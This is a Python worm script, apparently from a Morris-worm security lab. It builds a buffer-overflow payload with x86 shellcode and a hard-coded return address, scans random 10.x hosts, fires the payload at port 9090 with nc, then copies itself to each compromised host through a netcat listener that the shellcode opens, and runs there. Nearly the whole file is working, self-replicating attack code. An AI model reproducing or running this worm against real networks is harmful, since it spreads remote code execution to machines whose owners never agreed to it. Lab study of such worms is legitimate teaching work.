#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)'; ls -l;"
   " ls -l; nc -lnv 8090 > worm.py; ls -l; python3 worm.py "
   "                                                     *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + 50  # Need to change
   offset = 0xffffd5f8 -0xffffd588 + 4 # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   x = randint(151, 155)
   y = randint(70, 80)
   return '10.' + str(x) + '.0.' + str(y)

def isAlive(ipaddr):
  try:
    output = subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
    result = output.find(b'1 received')
  except:
    result = -1
  if result == -1:
    print(f"{ipaddr} is not alive", flush=True)
    return False
  else:
    print(f"*** {ipaddr} is alive, launch the attack", flush=True)
    return True

############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = '1.2.3.4'
    while True:
        targetIP = getNextTarget()
        if isAlive(targetIP):
            break

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    
    # Give the shellcode some time to run on the target host
    time.sleep(1)
    subprocess.run([f"cat worm.py | nc -w5 {targetIP} 8090"], shell=True)    


    # Sleep for 10 seconds before attacking another host
    time.sleep(3) 

    # Remove this line if you want to continue attacking others


